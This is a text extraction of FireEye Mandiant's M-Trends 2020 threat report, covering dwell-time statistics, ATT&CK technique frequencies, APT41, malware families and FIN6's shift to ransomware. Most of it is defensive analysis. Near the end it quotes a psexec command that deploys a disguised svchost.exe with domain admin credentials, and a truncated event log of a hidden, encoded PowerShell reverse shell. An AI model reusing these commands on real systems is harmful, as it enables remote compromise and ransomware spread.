2020
FIREEYE MANDIANT SERVICES | SPECIAL REPORT
[Word Count: 7]

FIREEYE MANDIANT SERVICES | SPECIAL REPORT
2020
[Word Count: 7]

Attacker Rewards: Gift Cards in the Crosshairs	
45
[Word Count: 8]

Common Weaknesses and Best Practices	
53
[Word Count: 6]

In earlier editions of M-Trends, we observed that while some things change, many 
things remain the same. For example, M-Trends 2010 discussed how phishing 
was the most common and successful method APT groups were using to gain 
initial access to an organization. That hasn’t changed. Many of the case studies in 
M-Trends 2020 also begin with phishing, perpetuating the widely held belief that 
people are typically the weakest link in the security chain.
[Word Count: 73]

FireEye has been detecting and responding to cyber attacks every 
day for over 15 years. The release of M-Trends® 2020 marks 11 years of 
providing the cyber security community with insights gained from the 
frontlines of those attacks.
[Word Count: 38]

While attacker tactics, techniques and procedures (TTPs) may not be changing 
dramatically, the overall trends are still evolving. For example, organizations are 
migrating to the cloud at an increasing rate, so M-Trends 2020 details cloud-
related incidents and some cloud best practices. Additional shifting trends and 
fresh observations in M-Trends 2020 include:
[Word Count: 52]

•	 Attackers continue to grow more adept at working across a range of
[Word Count: 13]

operating systems and device types, as well as in both on-premises and 
cloud architectures. Traditional barriers to attacker success continue to lessen 
over time. Put simply, more attackers can do more things in more diverse 
environments.
[Word Count: 36]

•	 APT41, a recently named prolific cyber threat group, is responsible for carrying
[Word Count: 13]

out Chinese state-sponsored espionage and financially motivated activity. 
This group dates back to at least 2012, when they were conducting financially 
motivated operations primarily targeting the video game industry—activity that 
preceded their state-sponsored campaigns.
[Word Count: 34]

•	 Of all the malware families observed by FireEye this year, 41 percent were
[Word Count: 14]

previously unknown. This means that malware authors are innovating—possibly 
in an attempt to evade detection technologies—and not just relying on updates 
to existing malware.
[Word Count: 24]

•	 Cyber criminals that historically targeted personal and credit card information
[Word Count: 11]

are increasingly turning to ransomware as a secondary source of income. Cyber 
criminals are also outsourcing tasks to monetize operations faster.
[Word Count: 21]

•	 To expand the way they monetize operations, attackers have been observed
[Word Count: 12]

targeting corporate reward systems to steal gift cards. These gift cards are then 
resold or used to make direct purchases.
[Word Count: 20]

Of course no edition of M-Trends would be complete without our “By the 
Numbers” data. Many readers are eager to learn if the industry is getting better at 
detecting attacks; this year, the answer is yes. From October 1, 2018, to September 
30, 2019, the global median dwell time was 56 days. That’s a big improvement over 
the 78-day global median dwell time we reported in M-Trends 2019.
[Word Count: 68]

In addition to dwell time data, this year we have introduced three new statistics to 
By the Numbers—an overview of which threat groups were active over the past 
year, an overview of new malware families observed in 2019 and a heat map of 
threat techniques aligned to the MITRE ATT&CK framework.
[Word Count: 51]

While TTPs, trends and observations may have evolved over the past decade, 
the goal of M-Trends has always stayed the same: to arm security teams with the 
knowledge they need to defend against today’s most often used cyber attacks, as 
well as lesser seen and emerging threats.
[Word Count: 47]

The information in this report has been sanitized to protect identities of victims 
and data.
[Word Count: 15]

The statistics reported in M-Trends 2020 are based on FireEye Mandiant 
investigations of targeted attack activity conducted between October 1, 
2018 and September 30, 2019.
[Word Count: 25]

Over the last year, Mandiant consultants observed a 12-percentage point decrease 
in the proportion of compromises detected internally. This is the largest decrease 
in this metric since 2011. For the first time in four years, external notifications 
exceeded internal detections. This shift is potentially due to a variety of factors, 
such as increases in cyber security vendor and law enforcement notifications, 
continued expansion of the cyber security industry, changes in public disclosure 
norms and compliance changes. It is unlikely that organizations’ ability to detect 
intrusions deteriorated, because other metrics show continued improvements in 
organizational detections and response.
[Word Count: 97]

Data from FireEye 
Mandiant Investigations
[Word Count: 5]

Internal detection is 
when an organization 
independently 
discovers that it has 
been compromised.
[Word Count: 13]

External notification 
is when an outside 
entity informs an 
organization that it has 
been compromised.
[Word Count: 15]

Compromise 
Notifications
2011
2012
2013
2014
2015
2016
2017
2018
2019
[Word Count: 11]

External
94%
63%
67%
69%
53%
47%
38%
41%
53%
[Word Count: 10]

Internal
6%
37%
33%
31%
47%
53%
62%
59%
47%
[Word Count: 10]

REGIONAL DETECTION BY SOURCE--2018-2019 COMPARISON
[Word Count: 5]

Organizations are finding and containing attackers faster. All dwell time 
measurements improved in the last year with incidents discovered internally 
improving the most, from 50 days to 30 days.
[Word Count: 29]

Compromise 
Notifications
2011
2012
2013
2014
2015
2016
2017
2018
2019
[Word Count: 11]

Internal Detection
—
—
—
—
56
80
57.5
50.5
30
[Word Count: 11]

External Notification
—
—
—
—
320
107
186
184
141
[Word Count: 11]

Dwell time is calculated 
as the number of days 
an attacker is present 
in a victim network 
before they are detected. 
The median represents 
a value at the midpoint 
of a data set sorted 
by magnitude.
[Word Count: 36]

In 2019, 41% of the compromises investigated by Mandiant experts had dwell 
times of 30 days or fewer, compared to 31% the previous year. Twelve percent of 
investigations had dwell times greater than 700 days which is consistent with the 
previous year.
[Word Count: 42]

These trends could be due to organizations developing their detection programs, 
as well as changes in attacker behaviors. Mandiant experts have seen a continued 
rise in disruptive attacks (such as ransomware and cryptocurrency miners) which 
often have shorter dwell times than other attack types.
[Word Count: 44]

The median dwell time for APAC during 2019 decreased to 54 days, from 204 days 
in the prior year.
[Word Count: 19]

This statistic is skewed by the significant amount of ransomware-related breaches 
(18% of all cases), which have a dwell time of zero days.
[Word Count: 23]

Without those ransomware cases, the median dwell time for APAC would be 
94 days, still an improvement over the prior year, but more indicative of the real 
trend observed in the region and in line with the median dwell times reported in 
M-Trends 2018 (498 days), and M-Trends 2019 (204 days).
[Word Count: 51]

We have observed that the dwell time trend is still reflective of several advanced 
breaches that remained undetected for a long time. Ten percent of breaches 
investigated during 2019 showed dwell times of more than three years, with the 
longest dwell-time reported in APAC being 2,854 days—nearly eight years. As in 
past years, attackers in APAC still maintain access in compromised organizations 
for far too long.
[Word Count: 66]

External notifications outnumbered internal detections compared to last year. 
This reflects the volume of notifications that organizations receive and the various 
sources of external notifications which are expanding beyond the traditional law 
enforcement notifications. While some of these EMEA incidents with external 
dwell times were long-running intrusions, many of them were remnants of historic 
attacks rather than active attacks.
[Word Count: 59]

Median Dwell Time
177  >
DAYS IN 2018
54
DAYS IN 2019
[Word Count: 12]

We continue to see consistent industry targeting in the last year when compared 
to past M-Trends. This consistency is the strongest in the “Top 10” industries year 
over year and is unlikely to substantively change for the foreseeable future.
[Word Count: 39]

Mandiant professionals responded to a number of attacks in the past year, 
observing that:
[Word Count: 14]

•	 7% originated with or used compromised third party access
[Word Count: 10]

•	 22% had data theft likely in support of intellectual property or espionage
[Word Count: 13]

•	 29% were likely for direct financial gain. This includes extortion, ransom, card
[Word Count: 13]

•	 3% of these targeted attacks were for the purpose of reselling access gained in
[Word Count: 15]

•	 4% likely served no purpose except for creating compromised architecture to
[Word Count: 12]

Eleven percent of all Mandiant engagements in this period were for responses 
or assessments in environments with a significant cloud component. Overall, we 
continue to see more clients adopt a hybrid environment strategy using a mix of 
on-premises and cloud architecture or services. And attackers are becoming more 
comfortable working across such hybrid environments to pursue their goals.
[Word Count: 58]

Re-Attack Rate 
In 2019, 31% of FireEye Mandiant Managed Defense customers who previously 
underwent a Mandiant Incident Response engagement were attacked within the 
following 12 months. In this context, an attack is considered to be an event in which 
one or more systems with unauthorized activity required further investigation. 
Such an investigation goes beyond the data typically reviewed or acquired to 
determine the legitimacy of an alert.
[Word Count: 67]

Similarly, in 2018, FireEye identified that the same percentage of Managed Defense 
customers, 31%, were attacked in the following 12 months. This re-emphasizes 
the need for organizations to be vigilant, especially those who have previously 
experienced an incident.
[Word Count: 38]

Our clients encountered activity from a wide range of established threat groups, as 
well as hundreds of new threat groups that emerged in the last year (Fig. 1). 
Six of 10 named financial threat groups (FIN) and 17 named APT groups (44% of all 
known APT groups) from six different countries were active. These named groups 
were joined by 159 other groups in intrusion attempts against our clients.
[Word Count: 68]

Encountered 
During Active 
FireEye
Mandiant 
Investigations
[Word Count: 6]

APT
Groups
41
2019 Active
APT Groups
17
Active 
APT Groups
From These 
Nation-States
[Word Count: 14]

• China
• Russia
• Iran
• North Korea
• Vietnam
• Pakistan
[Word Count: 13]

Figure 1. 
Active threat 
groups tracked.
[Word Count: 6]

Our ability to analyze malicious code and assign them to malware families remains 
critical to incident response efforts. In 2019, we observed over 500 new malware 
families, 58% of which were discovered through Mandiant service efforts, including 
incident responses (Fig. 2). The majority of these new samples either impacted 
Windows or multiple platforms. While we do see new malware families solely 
impacting macOS and Linux, they remain in the minority.
[Word Count: 70]

1.1 million Malware Samples 
Analyzed Per Day
1268
Total Tracked 
Malware Families
[Word Count: 12]

Total
Malware Families
Linux 
Eﬀective 
Malware
[Word Count: 6]

To support community and industry efforts, our findings are now mapped to
the MITRE ATT&CK framework. There remains some variance in ATT&CK 
techniques and naming conventions.
[Word Count: 26]

Over the last two years, FireEye worked with MITRE to augment their ATT&CK 
framework and work on merging the FireEye technique catalog. Over 1300 
existing FireEye techniques (and subsequent findings) have been mapped to 
applicable MITRE ATT&CK framework techniques. As FireEye continues to grow 
our techniques list and MITRE evolves the ATT&CK framework, we will continue 
to cross-map to improve both models, which may differ slightly from offerings by 
other vendors.
[Word Count: 71]

MITRE ATT&CK is a 
publicly-accessible 
knowledge base of 
adversary tactics and 
techniques based on 
real-world observations. 
It was designed to be 
a community-accepted 
and community-driven 
foundation to align 
methodologies and 
drive improvements.
[Word Count: 32]

Initial Reconnaissance
Initial Compromise
Establish Foothold
Escalate Privileges
[Word Count: 8]

Initial Access
Initial Access
Execution
Privilege Escalation
[Word Count: 7]

External Remote Services
28.19%
External Remote Services
28.19%
PowerShell
28.63%
Web Shell
15.86%
[Word Count: 13]

16.74%
Exploit Public-Facing 
Application
[Word Count: 4]

16.74%
Service Execution
28.19%
Valid Accounts
10.57%
[Word Count: 7]

Trusted Relationship
7.49%
Trusted Relationship
7.49%
Scheduled Task
10.57%
Path Interception
3.52%
[Word Count: 12]

Spearphishing Attachment
5.29%
Spearphishing Attachment
5.29%
Command-Line Interface
7.93%
Accessibility Features
3.08%
[Word Count: 12]

Spearphishing Link
4.41%
Spearphishing Link
4.41%
Windows Management 
Instrumentation
[Word Count: 9]

Execution
Dynamic Data Exchange
0.44%
NTFS File Attributes
0.88%
[Word Count: 9]

PowerShell
28.63%
Execution through API
0.44%
Hooking
0.44%
[Word Count: 8]

Service Execution
28.19%
Mshta
0.44%
Credential Access
[Word Count: 7]

Scheduled Task
10.57%
Persistence
Account Manipulation
10.13%
[Word Count: 7]

Command-Line Interface
7.93%
Registry Run Keys / Start 
Folder
[Word Count: 9]

Dynamic Data Exchange
0.44%
Create Account
4.85%
Credentials in Files
0.44%
[Word Count: 11]

Execution through API
0.44%
Winlogon Helper DLL
3.08%
Credentials in Registry
0.44%
[Word Count: 12]

Mshta
0.44%
Service Registry 
Permissions Weakness
[Word Count: 6]

2.20%
Two-Factor 
Authentication 
Interception
[Word Count: 4]

Defense Evasion
Local Job Scheduling
1.32%
[Word Count: 6]

Scripting
30.40%
Shortcut Modification
0.44%
[Word Count: 5]

File Deletion
10.57%
Obfuscated Files or 
Information
[Word Count: 7]

Modify Registry
6.61%
Indirect Command 
Execution
[Word Count: 6]

Disabling Security Tools
5.73%
File Deletion
10.57%
[Word Count: 7]

Code Signing
5.29%
Software Packing
9.25%
[Word Count: 6]

Connection Proxy
5.29%
Modify Registry
6.61%
[Word Count: 6]

Indicator Removal on Host
5.29%
Disabling Security Tools
5.73%
[Word Count: 9]

DLL Search Order Hijacking
3.96%
Code Signing
5.29%
[Word Count: 8]

DLL Side-Loading
3.96%
Connection Proxy
5.29%
[Word Count: 6]

Timestomp
3.96%
Indicator Removal on Host
5.29%
[Word Count: 7]

Web Service
3.96%
DLL Search Order Hijacking
3.96%
[Word Count: 8]

Indicator Blocking
3.08%
DLL Side-Loading
3.96%
[Word Count: 6]

Deobfuscate/Decode Files 
or Information
[Word Count: 4]

Masquerading
0.88%
Process Injection
2.20%
[Word Count: 5]

Execution Guardrails
0.44%
Deobfuscate/Decode Files 
or Information
[Word Count: 7]

Hidden Files and Directories
0.44%
Masquerading
0.88%
[Word Count: 7]

Figure 3. 
MITRE ATT&CK 
techniques related 
to attack lifecycle 
(heat map).
[Word Count: 11]

Internal Reconnaissance
Lateral Movement
Maintain Persistence
Mission Completion
[Word Count: 8]

Discovery
Persistence
Credential Access
Exfiltration
[Word Count: 5]

Security Software Discovery
7.49%
Registry Run Keys / Start Folder
5.29%
Account Manipulation
10.13%
Data Compressed
13%
[Word Count: 17]

System Information Discovery
5.73%
Create Account
4.85%
Credential Dumping
9.25%
Data Encrypted
4%
[Word Count: 13]

System Owner/User Discovery
5.29%
Winlogon Helper DLL
3.08%
Brute Force
5.29%
Impact
[Word Count: 12]

Query Registry
3.96%
Service Registry Permissions 
Weakness
[Word Count: 7]

2.20%
Credentials in Files
0.44%
Service Stop
8.37%
[Word Count: 8]

Account Discovery
3.52%
Local Job Scheduling
1.32%
Credentials in Registry
0.44%
Data Encrypted for Impact
4.85%
[Word Count: 16]

Permission Groups Discovery
3.52%
Modify Existing Service
0.44%
Two-Factor Authentication 
Interception
[Word Count: 11]

File and Directory Discovery
3.08%
Shortcut Modification
0.44%
Lateral Movement
Inhibit System Recovery
1.32%
[Word Count: 14]

Network Service Scanning
3.08%
Command And Control
Remote Desktop Protocol
18.94%
Stored Data Manipulation
1.32%
[Word Count: 15]

Process Discovery
3.08%
Standard Cryptographic 
Protocol
[Word Count: 6]

14.10%
Remote File Copy
10.57%
Defacement
0.44%
[Word Count: 7]

3.08%
Standard Application Layer 
Protocol
[Word Count: 5]

Domain Trust Discovery
1.32%
Multi-hop Proxy
2.20%
Windows Admin Shares
1.32%
[Word Count: 11]

Network Share Discovery
1.32%
Remote Access Tools
2.20%
Defense Evasion
[Word Count: 10]

0.88%
Custom Command and Control 
Protocol
[Word Count: 6]

1.76%
Obfuscated Files or Information
31.28%
[Word Count: 6]

Network Sniffing
0.44%
Obfuscated Files or Information
31.28%
Indirect Command Execution
12.78%
[Word Count: 12]

Password Policy Discovery
0.44%
Scripting
30.40%
File Deletion
10.57%
[Word Count: 9]

System Service Discovery
0.44%
Indirect Command Execution
12.78%
Software Packing
9.25%
[Word Count: 11]

System Time Discovery
0.44%
File Deletion
10.57%
Modify Registry
6.61%
[Word Count: 10]

Defense Evasion
Software Packing
9.25%
Disabling Security Tools
5.73%
[Word Count: 9]

Obfuscated Files or Information
31.28%
Modify Registry
6.61%
Code Signing
5.29%
[Word Count: 11]

Scripting
30.40%
Disabling Security Tools
5.73%
Connection Proxy
5.29%
[Word Count: 9]

Indirect Command Execution
12.78%
Code Signing
5.29%
Indicator Removal on Host
5.29%
[Word Count: 12]

File Deletion
10.57%
Connection Proxy
5.29%
DLL Search Order Hijacking
3.96%
[Word Count: 11]

Software Packing
9.25%
Indicator Removal on Host
5.29%
DLL Side-Loading
3.96%
[Word Count: 11]

Modify Registry
6.61%
DLL Search Order Hijacking
3.96%
Timestomp
3.96%
[Word Count: 10]

Disabling Security Tools
5.73%
DLL Side-Loading
3.96%
Web Service
3.96%
[Word Count: 10]

Code Signing
5.29%
Timestomp
3.96%
Indicator Blocking
3.08%
[Word Count: 8]

Connection Proxy
5.29%
Web Service
3.96%
Process Injection
2.20%
[Word Count: 9]

Indicator Removal on Host
5.29%
Indicator Blocking
3.08%
Rootkit
1.76%
[Word Count: 10]

DLL Search Order Hijacking
3.96%
Process Injection
2.20%
Deobfuscate/Decode Files or 
Information
[Word Count: 12]

DLL Side-Loading
3.96%
Rootkit
1.76%
Masquerading
0.88%
[Word Count: 7]

Timestomp
3.96%
Deobfuscate/Decode Files or 
Information
[Word Count: 6]

Web Service
3.96%
Masquerading
0.88%
Execution Guardrails
0.44%
[Word Count: 8]

Indicator Blocking
3.08%
Regsvr32
0.88%
Hidden Files and Directories
0.44%
[Word Count: 10]

Process Injection
2.20%
Execution Guardrails
0.44%
Process Hollowing
0.44%
[Word Count: 9]

Rootkit
1.76%
Hidden Files and Directories
0.44%
[Word Count: 7]

Deobfuscate/Decode Files or 
Information
[Word Count: 4]

BY THE  
NUMBERS
ADVANCED 
PERSISTENT 
THREAT 
GROUPS
[Word Count: 7]

FireEye tracks thousands of threat actors, including state-sponsored 
attackers responsible for carrying out advanced persistent threat 
(APT) attacks. Because the motivations of a state-sponsored attacker 
are often tied to strategic imperatives, APT threat actors often pursue 
their objectives over longer periods of time than other threat actors. 
Maintaining access to victim environments for months or years requires 
threat actors to be adept at handling attempts to remove their access.
[Word Count: 69]

In 2019, FireEye promoted one attack group from a tracked TEMP group to an APT 
group: APT41.
[Word Count: 17]

APT41 is a prolific cyber threat group responsible for carrying out Chinese 
state-sponsored espionage as well as financially motivated activity. The group’s 
activity dates to 2012 when APT41 conducted financially motivated operations 
focused on the video game industry (Fig. 4). This activity preceded their state-
sponsored activity.
[Word Count: 47]

Based on early observed activity and APT41’s focus on the video game industry, 
we believe the group’s cyber crime activities are most likely motivated by financial 
gain or hobbyist interests. This stands in contrast to the state-sponsored goals 
that likely drive the group’s targeting of higher education, telecommunications, 
travel services and news/media firms. The attacks appear to have been carried 
out as part of a surveillance operation. The group’s most recent activity included 
targeting call record information and SMS data.
[Word Count: 80]

Two identified personas using the monikers “Zhang Xuguang” and “Wolfzhi” 
linked to APT41 operations have also been identified in Chinese-language forums. 
These individuals advertised their skills and services and indicated that they could 
be hired.
[Word Count: 35]

APT41 is unique among China-based actors in that it leverages non-public malware 
typically reserved for espionage, in operations that appear to fall outside the scope 
of state-sponsored missions. The group’s mix of financial and state sponsored 
motivations are remarkable because this type of activity is unusual among Chinese 
state-sponsored threat groups.
[Word Count: 51]

APT41’s links to both underground marketplaces and state-sponsored activity may 
indicate the group is permitted to conduct its own for-profit activities. It is also 
possible that APT41 evaded scrutiny from Chinese authorities. Regardless, APT41 
operations underscore a blurred line between state power and crime that lies at 
the heart of threat ecosystems.
[Word Count: 52]

Initial Compromise
Establish Foothold
Escalate Privilege
Internal Reconnaissance
Complete Mission
[Word Count: 10]

• ADORE.XSEC
• CROSSWALK
• CROSSWALK.BIN
• FRONTWHEEL
• HIGHNOON
• HIGHNOON.BIN
• HIGHNOON.LINUX
• HOMEUNIX
• PACMAN
• PHOTO
• POISONPLUG
• ROCKBOOT
• SOGU
• Scheduled tasks
• Startup ﬁle
• Sticky Keys Vulnerability
• Windows Registry modiﬁcations
[Word Count: 40]

• CHINACHOP
• Credential theft
• CVE-2019-3396
• Spear-phishing
• Stolen credentials
• TeamViewer
[Word Count: 14]

• ACEHASH
• ASPXSpy
• Beacon
• CHINACHOP
• COLDJAVA
• CRACKSHOT
• CROSSWALK
• DEADEYE
• DOWNTIME
• EASYNIGHT
• Gh0st
• HIGHNOON
• HIGHNOON.LITE
• HIGHNOON/PASTEBOY
• HIKDOOR
• HOTCHAI
• JUMPALL
• LATELUNCH
• LIFEBOAT
• LOWKEY
• njRAT
• PHOTO
• POISONPLUG
• POISONPLUG.SHADOW
• POTROAST
• SAGEHIRE
• SWEETCANDLE
• TERA
• TIDYELF
• WINTERLOVE
• XDOOR
• ZXSHELL
• PowerShell
• Stickey Keys Vulnerability
[Word Count: 70]

• ACEHASH
• GEARSHIFT
• GOODLUCK
• Mimikatz
• NTDSDUMP
• PHOTO
• PwDUMP
• WINTERLOVE
• Nypass User Account Control
• Password hash dumping
• Windows Credential Editor 
 (WCE)
[Word Count: 30]

• HIGHNOON
• SOGU
• WIDETOWN
• Built-in Windows commands
 (ping, netstat, etc.)
[Word Count: 13]

• Encryptor RaaS
• XMRIG
• Clear “.bash_history” ﬁles
• Clear Windows securty and 
 system event logs
• Compress data using RAR
• Credential theft
• Delete scheduled tasks
• Intellectual property theft
• Modify DNS management 
 to avoid ant-virus detection
• Steal in-game currencies
[Word Count: 45]

• HIGHNOON
• SOGU
• Brute-force local admin 
 account
• Creation of user accounts 
 added to User and Admin 
 groups
• Modiﬁcation of the legitimate 
 WMI Performance Adapter
• RDP
• Scheduled tasks
• Stolen credentials
[Word Count: 36]

Figure 4. 
APT 41 TTPs across 
the attack lifecycle.
[Word Count: 9]

Malware family code is often examined using disassembler or decompiler tools, 
through a process called reverse engineering. Being a family does not require the 
code to be 100% identical. The most common differences FireEye sees among 
members of a family are related to configuration, command and control (CnC) 
addresses, and features. Depending on the features and how the malware evolves, 
FireEye sometimes identifies and tracks subgroups or subfamilies within a malware 
family. For FireEye Mandiant, defining a code family is part science and part art, 
and may involve comparison and analysis by automated systems and experts.
[Word Count: 96]

In samples found in the field between October 2018 and September 2019, Mandiant 
researchers encountered 186 unique malware families, comprised of tens of 
thousands of malware samples. These statistics do not include malware that has 
been analyzed, but not assigned to a malware family.
[Word Count: 44]

•	 41% of the malware families seen this year were never seen before.
[Word Count: 13]

•	 70% of the samples identified belonged to one of the five most frequently seen
[Word Count: 15]

families, which are based on open source tools with active development.
[Word Count: 11]

•	 23% of the malware observed in this reporting period is publicly available and
[Word Count: 14]

used by a range of attackers with varying skill levels.
[Word Count: 10]

•	 The vast majority of malware is written to elevate privileges and move laterally in
[Word Count: 15]

Mandiant researchers analyzed the 186 unique malware families from Mandiant 
engagements this year to reveal six traits and trends. Traits focus on the malware 
specifics, such as category, file type, accessibility and obfuscation. Trends include 
the top families and how many of them were new in 2019.
[Word Count: 47]

A malware family is 
a program or set of 
associated programs 
with sufficient “code 
overlap” among the 
members that FireEye 
considers them to 
be the same thing, a 
“family”. The term family 
broadens the scope of 
a single piece of 
malware as it can be 
altered over time, which 
in turn creates new, 
but fundamentally 
overlapping pieces 
of malware.
[Word Count: 59]

Category Mandiant analysts assign categories to malware samples based on their 
classification and behavior (Fig. 5). Each binary is placed into only one category. 
While a backdoor might have the ability to steal credentials, if the primary purpose 
of the malware was to function as a backdoor it would be counted as a backdoor. 
Inversely, something will only be labeled as a credential stealer only if it’s primary 
function is to steal credentials.
[Word Count: 73]

Figure 5. 
Categories 
assigned to 
malware families 
in 2019.
[Word Count: 9]

Backdoor 	
Allow an attacker to establish control over a victim host. Provides 	
	
interactive functionality such as sleep, file transfer, credential 
	
stealing, keylogging, reverse shells and process manipulation.
[Word Count: 27]

Dropper 	
Extract, install and potentially launch or execute one or more 	
	
	
malware files.
[Word Count: 13]

Credential Stealer 	
Access, copy or steal authentication credentials.
[Word Count: 8]

Point of Sale (POS) 	
Obtain payment card information.
[Word Count: 8]

Ransomware 	
Perform some malicious action (most often data encryption), with the 	
	
goal of denying access until a ransom is paid.
[Word Count: 20]

Other 	
Includes keyloggers, rootkits, bootkits and utilities. Keyloggers record 	
	
keystrokes. Rootkits hide other malware. Bootkits are embedded 
	
deep in a system’s boot process. Utilities are tools and supporting 
	
files that perform functions such as clearing log files.
[Word Count: 37]

File Type The file format or file structure of malware may indicate the architecture 
or operating system the attacker was targeting. Although most of the samples 
analyzed were Portable Executable (PE) files, we had four Linux families (Fig. 6). 
The remainder consists of scripts, WebShells, and .NET malware.
[Word Count: 48]

Portable Executable (PE) 	 Portable Executable; the executable file format for
	
Microsoft Windows
[Word Count: 12]

WindowsScripts 	
Script-based malware e.g. JavaScript or Python
[Word Count: 7]

WebShells 	
Backdoors for web servers; many use PHP
[Word Count: 8]

.NET 	
A framework for applications; mostly written in C#
[Word Count: 9]

ELF & PE 	
Some malware families have both Windows and Linux versions
[Word Count: 12]

Figure 6. 
File types for 
malware families 
seen in the 
last year.
[Word Count: 12]

Accessibility Malware family accessibility (Fig. 7) is labeled as available or private. 
Available means that the sample is publicly available via open-source or can be 
easily obtained on underground forums. Private means that it isn’t easily found or 
is closed source.
[Word Count: 41]

Obfuscation Scripts are obfuscated or packed to hinder analysis, especially 
by automated systems, since many static analysis tools cannot process such 
samples. For example, a WebShell may change variable and function names, 
control flow and string encoding. Malware in the form of executable files use 
packing to make their payloads small or inhibit analysis. Many open source and 
commercial products can obfuscate or pack a sample.
[Word Count: 66]

Packed or obfuscated samples are trivial to detect because they stand out due to 
high entropy; most benign executables are not packed or obfuscated (Fig. 8).
[Word Count: 26]

Figure 7. 
How easy 
malware families 
are obtained by 
attackers.
[Word Count: 10]

Figure 8. 
Amount of 
obfuscated/packed 
malware families.
[Word Count: 7]

New Families Forty-one percent of the malware families seen over the past year 
had not been seen before by Mandiant researchers (Fig. 9).
[Word Count: 23]

Top Families After analyzing tens of thousands of malware variants across 186 
malware families in 2019, we noted that over 70% of the variants belonged to just 
five malware families (Fig. 10).
[Word Count: 32]

Figure 9. 
New Families 
discovered this 
past year.
[Word Count: 8]

Figure 10. 
Top malware 
families across 
variants.
[Word Count: 7]

•	 BEACON A publicly available endpoint agent for Cobalt Strike. It is a popular
[Word Count: 14]

commercial dual-use penetration toolkit with configurable CnC channels and a 
robust feature set. While a new yearly license is $3500, this kit is readily available 
on pirated websites and forums. Mandiant analysts have observed the following 
named attack groups using BEACON: APT19, APT32, APT40, APT41, FIN6, and 
FIN7. These groups represent a diverse mix of skillsets and motivations.
[Word Count: 58]

•	 EMPIRE An open-source post-exploitation framework and PowerShell endpoint
[Word Count: 9]

agent. It provides post-exploitation modules ranging from keyloggers to 
Mimikatz, and adaptable network communications to evade network detection. 
Much like BEACON, Mandiant has observed EMPIRE being used by a wide range 
of attackers at all skill levels, including APT19, APT33, and FIN10.
[Word Count: 42]

•	 TRICKBOT A modular banking trojan that uses web injects. This technique
[Word Count: 12]

allows malware to intercept users attempting to access legitimate websites 
and “injects” malicious content to steal credentials and financial information. 
Default modules include banking and user Information theft, system/network 
reconnaissance and credential and network propagation. This framework is also 
used to install other malware and tools. Over the past year, we saw TRICKBOT 
used in conjunction with EMPIRE and RYUK (a ransomware tool) at a number of 
FireEye clients.
[Word Count: 69]

•	 SHORTBENCH A downloader used to download and execute shellcode to
[Word Count: 11]

download and install additional malware and tools. It is a simple, lightweight 
and open-sourced framework. SHORTBENCH can be used to download virtually 
any follow-on payload and has been observed in use by diverse actors in a wide 
range of event types.
[Word Count: 41]

•	 QAKBOT A complex and full-featured modular stealthy banking trojan first seen
[Word Count: 12]

in 2008. It has worm-like propagation capabilities and anti-analysis features. 
Qakbot is typically delivered via phishing email, exploit kit, removable drive and 
infected web pages. The malware is typically used to steal sensitive information, 
such as banking and email credentials. Financial targets and other targeted 
domains and blacklisted sites are hard-coded into the malware. We saw a sharp 
decline in the use of QAKBOT in the last year.
[Word Count: 68]

The successful monetization of ransomware attacks and the availability of 
ransomware as a service have contributed to an increase in ransomware cases. 
It has also led some established cyber crime groups to turn to ransomware as a 
secondary means of generating revenue. In 2019 we saw several cases in which 
threat actors that historically targeted sensitive information such as personally 
identifiable information (PII) and credit card information turned to ransomware to 
monetize access to victim networks.
[Word Count: 76]

Mandiant analysts linked the tools and attacker infrastructure to other FIN6 
activity, and eventually concluded that FIN6 had expanded to using ransomware to 
further monetize their access to compromised environments.
[Word Count: 30]

start copy svchost.exe \\10.1.1.1\c$\windows\temp\start psexec.exe \\10.1.1.1 

-u domain\domainadmin -p “password” -d -h -r mstdc -s -accepteula -nobanner 

c:\windows\temp\svchost.exe
[Word Count: 18]

Figure 11. 
Strings from 
deployment BAT 
files.
[Word Count: 7]

Conclusion
Given the ease at which ransomware attacks can be carried out and the willingness 
of victims to pay, FireEye has assessed that threat groups will continue to 
leverage ransomware as a secondary means for monetizing their access to victim 
environments.
[Word Count: 41]

Profit-motivated cyber criminals are known to outsource elements of their 
operations to counterparts operating in underground communities. There are 
several common elements of malicious campaigns, corresponding marketplace 
offerings and notable trends surrounding this issue (Fig. 12).
[Word Count: 36]

Figure 12. 
Common elements 
of crimeware 
marketplace 
offerings.
[Word Count: 8]

Sample of Corresponding Marketplace Offerings
[Word Count: 5]

The level of access that an actor advertises 
is the most influential price factor, although 
some trends in industry were also observed.
[Word Count: 22]

Actors continue advertising ransomware 
affiliate programs. These actors typically 
look for multiple partners who can distribute 
ransomware in diversified ways such as 
through spam, RDP and network access.
[Word Count: 28]

Stolen payment card data is commonly 
monetized through card shops. Various 
factors can influence pricing of payment card 
information, including the data’s freshness, 
the region from which the payment card 
data was collected, and each card’s average 
associated value.
[Word Count: 39]

Examples of Common Elements of Malicious Campaigns
[Word Count: 7]

Average price of payment card information, by region. 
Price of accesses and market share, by industry.
[Word Count: 16]

From a POS server, the attacker deployed SCRAPMINT POS malware, a tool that 
identifies Track 1 and Track 2 payment card information in memory and writes it to a 
file. SCRAPMINT is used by several threat actors that use disparate tactics, techniques 
and procedures. We have not observed SCRAPMINT as publicly available, so it may be 
offered by private providers or shared among a group of attackers.
[Word Count: 67]

Figure 13. 
Truncated event 
log associated 
with execution 
of MetaSploit 
reverse shell.
[Word Count: 12]

The use of tool or service providers allows cyber criminals to increase the speed 
at which they monetize an operation. The use of such providers was evident 
throughout the financially motivated operations investigated by Mandiant 
consultants in 2019. Common examples included:
[Word Count: 41]

•	 Attackers using malware that was available for purchase
[Word Count: 9]

•	 Use of card shops to sell stolen payment card data
[Word Count: 11]

•	 Victim PII offered for sale in criminal forums
[Word Count: 9]

•	 Access to victim networks offered for sale in criminal forums
[Word Count: 11]

A service was installed in the system. Service Name: WAkUwdQtTYCHqlHw 
Service File Name: %COMSPEC% /b /c start /b /min powershell.exe -nop -w 
hidden -c if([IntPtr]::Size -eq 4){$b=&amp;apos;powershell.exe&amp;apos;}
else{$b=$env:windir+&amp;apos;\syswow64\WindowsPowerShell\v1.0\powershell.
exe&amp;apos;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.
FileName=$b;$s.Arguments=&amp;apos;-nop -w hidden -e JABzAD0ATgBlA<TRUNCATED FOR
[Word Count: 36]

BREVITY>BvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApAD­
sA&amp;apos;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.
WindowStyle=&amp;apos;Hidden&amp;apos;;$s.CreateNoWindow=$true;$p=[System.
Diagnostics.Process]::Start($s); Service Type: user mode service Start Type: 
